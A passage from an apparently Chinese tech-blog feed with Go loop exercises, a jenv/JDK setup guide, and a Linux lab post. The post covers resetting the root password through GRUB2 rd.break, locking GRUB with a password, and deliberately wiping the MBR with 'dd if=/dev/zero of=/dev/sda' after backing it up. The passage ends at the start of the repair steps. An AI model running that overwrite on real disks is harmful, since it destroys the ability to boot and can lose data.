<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> totalLevel <span class="type">int</span> = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= totalLevel; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> k := <span class="number">1</span>; k &lt;= totalLevel-i; k++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot; &quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">2</span>*i<span class="number">-1</span>; j++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128171918526.png" alt="image-20221128171918526"></p>
<p>在修改题目，打印空心金字塔</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分析：在我们打印每行 * 号时，需要考虑是打印 * 还是打印 空格</span></span><br><span class="line"><span class="comment">// 分析结果是，每层的第一个和最后一个打印*，其他就应该是空的。</span></span><br><span class="line"><span class="keyword">var</span> totalLevel <span class="type">int</span> = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= totalLevel; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> k := <span class="number">1</span>; k &lt;= totalLevel-i; k++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot; &quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">2</span>*i<span class="number">-1</span>; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> j == <span class="number">1</span> || j == <span class="number">2</span>*i<span class="number">-1</span> &#123;</span><br><span class="line">				fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				fmt.Print(<span class="string">&quot; &quot;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128172445711.png" alt="image-20221128172445711"></p>
<p><strong>但是这个打印到最后没封底就很不美观，所以要封底。</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分析：在我们打印每行 * 号时，需要考虑是打印 * 还是打印 空格</span></span><br><span class="line"><span class="comment">// 分析结果是，每层的第一个和最后一个打印*，其他就应该是空的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> totalLevel <span class="type">int</span> = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= totalLevel; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> k := <span class="number">1</span>; k &lt;= totalLevel-i; k++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot; &quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">2</span>*i<span class="number">-1</span>; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> j == <span class="number">1</span> || j == <span class="number">2</span>*i<span class="number">-1</span> || i == totalLevel &#123;</span><br><span class="line">				fmt.Print(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				fmt.Print(<span class="string">&quot; &quot;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221128173341992.png" alt="image-20221128173341992"></p>
<h2 id="打印九九乘法表"><a href="#打印九九乘法表" class="headerlink" title="打印九九乘法表"></a>打印九九乘法表</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++ &#123; <span class="comment">//打印九行</span></span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= i; j++ &#123; <span class="comment">//有几行就打印几列</span></span><br><span class="line">			fmt.Printf(<span class="string">&quot;%v * %v = %v \t&quot;</span>, j, i, j*i)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/%E7%BC%96%E7%A8%8B%E6%A1%88%E4%BE%8B/image-20221208200330636.png" alt="image-20221208200330636"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>版本切换工具篇</title>
    <url>/2022/11/23/%E7%89%88%E6%9C%AC%E5%88%87%E6%8D%A2%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
    <content><![CDATA[<h1 id="版本切换工具篇"><a href="#版本切换工具篇" class="headerlink" title="版本切换工具篇"></a>版本切换工具篇</h1><h2 id="JENV管理JDK"><a href="#JENV管理JDK" class="headerlink" title="JENV管理JDK"></a>JENV管理JDK</h2><p><strong>jdk全称”Java Development Kit“，指的是Java语言的软件开发工具包，主要用于移动设备、嵌入式设备上的java应用程序的开发。jdk是java开发的核心，包括了JRE（Java运行环境）运行时类库、JVM（Java虚拟机）。</strong></p>
<p><strong>一般，我们需要用到基于Java虚拟机的操作服务时，需要有JDK的环境，这样的Java有两个特点（Write once, run anywhere）：</strong></p>
<ul>
<li><strong>易于移植：只需要有Java的虚拟机（JDK）环境，即可运行Java程序。</strong></li>
<li><strong>需要平台有Java虚拟机支持：Java程序有所限制，需要有Java环境支持</strong></li>
</ul>
<p><strong>大部分程序开发者，或者普通用户，都有了解过JDK的配置。但是：</strong></p>
<ul>
<li><strong>Linux服务器上怎么配置JDK呢？</strong></li>
<li><strong>能否实现多版本JDK同时配置安装呢？</strong></li>
</ul>
<p><strong>本次教程，就在Linux（ubuntu系统）上安装多版本JDK，并使用Jenv管理JDK。</strong></p>
<h3 id="安装思路"><a href="#安装思路" class="headerlink" title="安装思路"></a>安装思路</h3><h4 id="常规（传统）安装"><a href="#常规（传统）安装" class="headerlink" title="常规（传统）安装"></a>常规（传统）安装</h4><p><strong>我们通常安装JDK是：</strong></p>
<ul>
<li><strong>Centos系统使用<code>yum</code>包管理器安装&#x2F;Ubuntu使用<code>apt</code>包管理器安装，然后直接使用。</strong></li>
<li><strong>上传源码包、解压源码包、在环境变量文件中追加<code>JAVA_HOME</code>然后<code>source</code>重载配置后使用。</strong></li>
</ul>
<h4 id="前卫安装"><a href="#前卫安装" class="headerlink" title="前卫安装"></a>前卫安装</h4><p><strong>在前面常规（传统）安装的前提下，追加<code>Jenv</code>的配置，实现JDK的切换：</strong></p>
<p><strong>确定使用OpenJDK和JDK的版本之后，使用<a href="https://www.azul.com/downloads/?package=jdk#download-openjdk">ZuluJDK（一个OpenJDK的发行版本）</a></strong></p>
<h5 id="安装JDK8"><a href="#安装JDK8" class="headerlink" title="安装JDK8"></a>安装JDK8</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wget 下载源码包</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># wget https://cdn.azul.com/zulu/bin/zulu8.66.0.15-ca-jdk8.0.352-linux_x64.tar.gz</span></span><br><span class="line"><span class="comment"># 创建源码包保存目录</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># mkdir /JDK</span></span><br><span class="line"><span class="comment"># 解压源码包至保存目录</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># tar -xzvf zulu8.66.0.15-ca-jdk8.0.352-linux_x64.tar.gz -C /JDK/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置JAVA_HOME</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># vim .bashrc</span></span><br><span class="line"><span class="comment"># JAVA环境变量配置</span></span><br><span class="line">JAVA_HOME=/JDK/jdk8</span><br><span class="line">CLASSPATH=<span class="variable">$JAVA_HOME</span>/lib/</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin/</span><br><span class="line"><span class="built_in">export</span> PATH JAVA_HOME CLASSSPATH</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重载配置</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># source ~/.bashrc </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看版本（JDK1.8就是JDK8）</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># java -version</span></span><br><span class="line">openjdk version <span class="string">&quot;1.8.0_352&quot;</span></span><br><span class="line">OpenJDK Runtime Environment (Zulu 8.66.0.15-CA-linux64) (build 1.8.0_352-b08)</span><br><span class="line">OpenJDK 64-Bit Server VM (Zulu 8.66.0.15-CA-linux64) (build 25.352-b08, mixed mode)</span><br></pre></td></tr></table></figure>

<h3 id="多版本JDK管理"><a href="#多版本JDK管理" class="headerlink" title="多版本JDK管理"></a>多版本JDK管理</h3><h4 id="安装JENV"><a href="#安装JENV" class="headerlink" title="安装JENV"></a>安装JENV</h4><p><a href="https://www.jenv.be/">Jenv项目地址</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用git下载jenv源码到用户目录下的.jenv文件夹</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># git clone https://github.com/jenv/jenv.git ~/.jenv</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># vim .bashrc</span></span><br><span class="line"><span class="comment"># Jenv配置环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$HOME</span>/.jenv/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(jenv init -)</span>&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重载配置(会出现“jenv has been updated, process to refresh plugin links”这句话，说明配置成功)</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># source ~/.bashrc </span></span><br></pre></td></tr></table></figure>

<p><strong>现在jenv就可以使用了：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv help</span></span><br></pre></td></tr></table></figure>

<h4 id="切换JDK"><a href="#切换JDK" class="headerlink" title="切换JDK"></a>切换JDK</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前安装的JDK版本</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv versions</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 局部JDK11</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv local 11</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局JDK11</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv global 11</span></span><br></pre></td></tr></table></figure>

<h4 id="管理JDK"><a href="#管理JDK" class="headerlink" title="管理JDK"></a>管理JDK</h4><p><strong>有时候，jenv的add扫描，扫描的内容过多怎么办呢？比如，我只添加了JDK8、JDK11,怎么会有这么多版本JDK：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv versions</span></span><br><span class="line">* system (<span class="built_in">set</span> by /root/.jenv/version)</span><br><span class="line">  11</span><br><span class="line">  11.0</span><br><span class="line">  11.0.17</span><br><span class="line">  1.8.0.352</span><br><span class="line">  1.8</span><br><span class="line">  1.8.0.352</span><br><span class="line">  zulu64-1.8.0.352</span><br></pre></td></tr></table></figure>

<p><strong>这个时候也很简单，使用remove命令即可：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv remove zulu64-1.8.0.352</span></span><br><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv remove 1.8</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-4-12-ubuntu:~<span class="comment"># jenv versions</span></span><br><span class="line">  system</span><br><span class="line">  11.0.17</span><br><span class="line">* 1.8.0.352 (<span class="built_in">set</span> by /root/.jenv/version)</span><br></pre></td></tr></table></figure>

<h2 id="NVM管理Node-js"><a href="#NVM管理Node-js" class="headerlink" title="NVM管理Node.js"></a>NVM管理Node.js</h2>]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>环境工具</tag>
      </tags>
  </entry>
  <entry>
    <title>系统毁灭者MBR</title>
    <url>/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="安全控制"><a href="#安全控制" class="headerlink" title="安全控制"></a>安全控制</h1><h2 id="一-重置root密码"><a href="#一-重置root密码" class="headerlink" title="一.重置root密码"></a>一.重置root密码</h2><p><strong>Centos7 与之前的版本不同，当忘记 root 密码，并采用 GRUB2 为启动器时，将无法通过单用户模式重 置 root 密码</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.启动系统，并在GRUB2启动屏显时，按下 e 键进入编辑模式</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525143741425-16534607203081.png" alt="image-20220525143741425"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2.按e后，看到如下画面：</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525143824081-16534607221172.png" alt="image-20220525143824081"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3.找到 linux16 开头的行，按 end 键跳转到最后，空格后，输入 rd.break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525144314955.png" alt="image-20220525144314955"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 4.按 ctrl+x 进入紧急救援模式</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525144530907.png" alt="image-20220525144530907"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5.重新挂载系统分区，输入</span></span><br><span class="line">mount -o remount,rw /sysroot</span><br><span class="line"><span class="comment"># 6.再输入</span></span><br><span class="line"><span class="built_in">chroot</span> /sysroot</span><br><span class="line"><span class="comment"># 改变根</span></span><br><span class="line"><span class="comment"># 7.当前目录变为根目录，即可更改密码</span></span><br><span class="line"><span class="built_in">echo</span> 123456 | passwd --stdin root</span><br><span class="line"><span class="comment"># 8.如果之前系统启用了 SElinux，则必须运行</span></span><br><span class="line"><span class="built_in">touch</span> /.autorelabel</span><br><span class="line">否则将无法正常启动系统</span><br><span class="line"><span class="comment"># 9.输入 exit 退出</span></span><br><span class="line"><span class="comment"># 10.输入 reboot 重新启动</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525145647885.png" alt="image-20220525145647885"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 登录测试，密码123456更新成功</span></span><br></pre></td></tr></table></figure>



<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525150014292.png" alt="image-20220525150014292"></p>
<h2 id="二-强密码修改安全性"><a href="#二-强密码修改安全性" class="headerlink" title="二.强密码修改安全性"></a>二.强密码修改安全性</h2><h3 id="矛与盾"><a href="#矛与盾" class="headerlink" title="矛与盾"></a>矛与盾</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><ul>
<li><strong>为 GRUB2 菜单加上防编辑密码，以防止恶意者像如上一样修改 root 密码</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.用 grub2-mkpasswd-pbkdf2 命令生成加密口令</span></span><br><span class="line">[root@localhost ~]<span class="comment"># grub2-mkpasswd-pbkdf2 </span></span><br><span class="line">输入口令：                <span class="comment"># 不是root密码</span></span><br><span class="line">Reenter password: </span><br><span class="line">PBKDF2 <span class="built_in">hash</span> of your password is grub.pbkdf2.sha512.10000.D167D00E2EB2403C60A1F73D67E8E09ED1D0BD871ECC04D15AC815C9E1FCC178D4BC2B05FA4A1DEA67FBC1DD29CEF48EF662E1D5DB8C16AAB4F27FC353815FF5.43D49742A39635DE65BF5631802EB4041E38E65A05AB8AD6F498538873FA241599DE784CE0CF63E4E3FE68DC0FE635251A74EBC53C62239480AE558D68BA77D3</span><br></pre></td></tr></table></figure>

<p><strong>然后</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /etc/grub.d/00_header </span></span><br><span class="line"><span class="comment"># 在最后位置写入这个脚本命令</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">set superusers=&quot;root&quot;   # 这个是账号，可以随心填，但是要记住它和上面的密码</span></span><br><span class="line"><span class="string">password_pbkdf2 root grub.pbkdf2.sha512.10000.D167D00E2EB2403C60A1F73D67E8E09ED1D0BD871ECC04D15AC815C9E1FCC178D4BC2B05FA4A1DEA67FBC1DD29CEF48EF662E1D5DB8C16AAB4F27FC353815FF5.43D49742A39635DE65BF5631802EB4041E38E65A05AB8AD6F498538873FA241599DE784CE0CF63E4E3FE68DC0FE635251A74EBC53C62239480AE558D68BA77D3</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<h3 id="重新生成grub2"><a href="#重新生成grub2" class="headerlink" title="重新生成grub2"></a>重新生成grub2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># grub2-mkconfig -o /boot/grub2/grub.cfg </span></span><br><span class="line">Generating grub configuration file ...</span><br><span class="line">Found linux image: /boot/vmlinuz-3.10.0-1160.66.1.el7.x86_64</span><br><span class="line">Found initrd image: /boot/initramfs-3.10.0-1160.66.1.el7.x86_64.img</span><br><span class="line">Found linux image: /boot/vmlinuz-3.10.0-1160.el7.x86_64</span><br><span class="line">Found initrd image: /boot/initramfs-3.10.0-1160.el7.x86_64.img</span><br><span class="line">Found linux image: /boot/vmlinuz-0-rescue-dbecb3d028cd4f5db6753a52b01ffd86</span><br><span class="line">Found initrd image: /boot/initramfs-0-rescue-dbecb3d028cd4f5db6753a52b01ffd86.img</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># vim /boot/grub2/grub.cfg</span></span><br><span class="line"><span class="built_in">set</span> superusers=<span class="string">&quot;root&quot;</span></span><br><span class="line">password_pbkdf2 root grub.pbkdf2.sha512.10000.D167D00E2EB2403C60A1F73D67E8E09ED1D0BD871ECC04D15AC815C9E1FCC178D4BC2B05FA4A1DEA67FBC1DD29CEF48EF662E1D5DB8C16AAB4F27FC353815FF5.43D49742A39635DE65BF5631802EB4041E38E65A05AB8AD6F498538873FA241599DE784CE0CF63E4E3FE68DC0FE635251A74EBC53C62239480AE558D68BA77D3</span><br><span class="line"><span class="comment">### END /etc/grub.d/00_header # 在这个文件上面写入以上参数，也可以达到一样效果。。。我是傻x</span></span><br></pre></td></tr></table></figure>

<h3 id="进入grub2"><a href="#进入grub2" class="headerlink" title="进入grub2"></a>进入grub2</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 再次进入 GRUB2 页面，发现需要输入账户名与密码</span></span><br></pre></td></tr></table></figure>


<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525155917825.png" alt="image-20220525155917825"></p>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525155936054.png" alt="image-20220525155936054"></p>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525160014769.png" alt="image-20220525160014769"></p>
<h2 id="三-破坏MBR"><a href="#三-破坏MBR" class="headerlink" title="三.破坏MBR"></a>三.破坏MBR</h2><ul>
<li><p><strong>MBR</strong></p>
<ul>
<li><strong>master boot record</strong> </li>
<li><strong>主引导记录，也叫主引导扇区</strong> </li>
<li><strong>硬盘的 0 柱面，0 磁头，1 扇区称为主引导扇区</strong> </li>
<li><strong>其中 446 Byte 是 bootloader，64 Byte 是 partition table，剩下的 2 Byte 是 magic number</strong> </li>
<li><strong>一般破坏的是bootloader</strong></li>
</ul>
<hr>
<p><strong>Linux是文件型的操作系统，所有的信息和数据都以文件形式保存于系统中，但是并不是所有的数据，主 引导记录就不是以文件的形式保存，无法进行备份，只能通过 dd 命令备份</strong></p>
</li>
<li><p><strong>先进行备份，再破坏</strong></p>
<ul>
<li><strong>使用 dd 命令，将 sda 的 MBR 进行备份</strong> </li>
<li><strong>用 zero设备生成 446 字节的 “0” 写入 MBR</strong> </li>
<li><strong>重启后发现系统已坏</strong></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># fdisk -l</span></span><br><span class="line"></span><br><span class="line">磁盘 /dev/sda：107.4 GB, 107374182400 字节，209715200 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0x000b88c2</span><br><span class="line"></span><br><span class="line">   设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/sda1   *        2048     2099199     1048576   83  Linux</span><br><span class="line">/dev/sda2         2099200   209715199   103808000   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">磁盘 /dev/mapper/centos-root：53.7 GB, 53687091200 字节，104857600 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 /dev/mapper/centos-swap：4160 MB, 4160749568 字节，8126464 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 /dev/mapper/centos-home：48.4 GB, 48444211200 字节，94617600 个扇区</span><br><span class="line">Units = 扇区 of 1 * 512 = 512 bytes</span><br><span class="line">扇区大小(逻辑/物理)：512 字节 / 512 字节</span><br><span class="line">I/O 大小(最小/最佳)：512 字节 / 512 字节</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># dd if=/dev/sda of=/root/mbr.bak count=1 bs=512</span></span><br><span class="line">记录了1+0 的读入</span><br><span class="line">记录了1+0 的写出</span><br><span class="line">512字节(512 B)已复制，0.000344858 秒，1.5 MB/秒</span><br><span class="line">[root@localhost ~]<span class="comment"># dd if=/dev/zero of=/dev/sda count=1 bs=446</span></span><br><span class="line">记录了1+0 的读入</span><br><span class="line">记录了1+0 的写出</span><br><span class="line">446字节(446 B)已复制，0.000186601 秒，2.4 MB/秒</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>if&#x3D;&#x2F;dev&#x2F;sda</strong> <ul>
<li><strong>interface 输入接口</strong></li>
</ul>
</li>
<li><strong>of&#x3D;&#x2F;root&#x2F;mbr.bak</strong> <ul>
<li><strong>outerface 输出接口</strong></li>
</ul>
</li>
<li><strong>count&#x3D;1</strong> <ul>
<li><strong>写一块</strong></li>
</ul>
</li>
<li><strong>bs&#x3D;512</strong> <ul>
<li><strong>将整个扇区选中</strong></li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p><strong>Unix&#x2F;Linux将每一个设备都当成一个文件，放在&#x2F;dev目录</strong> </p>
<ul>
<li><p><strong>这些文件有的对应着一个真实存在的物理设备</strong> </p>
</li>
<li><p><strong>有的则代表一个虚拟设备，提供一些特定的功能</strong></p>
</li>
</ul>
</li>
<li><p><strong>&#x2F;dev&#x2F;null</strong> </p>
<ul>
<li><p><strong>“空”设备，也有人称它为黑洞</strong> </p>
</li>
<li><p><strong>任何输入到这个“设备”的数据都将被直接丢弃</strong> </p>
</li>
<li><p><strong>最常用的用法是把不需要的输出重定向到这个文件</strong></p>
</li>
</ul>
</li>
<li><p><strong>&#x2F;dev&#x2F;zero</strong> </p>
<ul>
<li><p><strong>“零”设备，可以无限的提供空字符（0x00，ASCII代码NUL）</strong> </p>
</li>
<li><p><strong>常用来生成一个特定大小的文件</strong></p>
</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># dd if=/dev/zero of=/swapfile bs=1M count=4096 status=progress #创建4G的交换空间 大小根据需要自定</span></span><br></pre></td></tr></table></figure>

<p><strong>这也是我喜欢用交换文件而不是交换分区的一个特点之一_方便</strong></p>
<h2 id="四-修复MBR"><a href="#四-修复MBR" class="headerlink" title="四.修复MBR"></a>四.修复MBR</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># reboot</span></span><br><span class="line"><span class="comment"># 重启后，发现无法正常启动 </span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525174104226.png" alt="image-20220525174104226"></p>
<ul>
<li><strong>连接光盘，重启后进入系统安装光盘，在光盘引导界面选择 Troubleshooting</strong></li>
</ul>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525190633165.png" alt="image-20220525190633165"></p>
<ul>
<li><strong>选择救援模式 Rescue a Centos system</strong></li>
</ul>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525190612467.png" alt="image-20220525190612467"></p>
<ul>
<li><strong>输入1，选择Continue，以 rw 模式挂载分区</strong></li>
</ul>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525190742957.png" alt="image-20220525190742957"></p>
<ul>
<li>回车，进入救援模式</li>
</ul>
<p><img src="/2022/08/09/%E7%B3%BB%E7%BB%9F%E6%AF%81%E7%81%AD%E8%80%85MBR/image-20220525190905564.png" alt="image-20220525190905564"></p>
<ul>
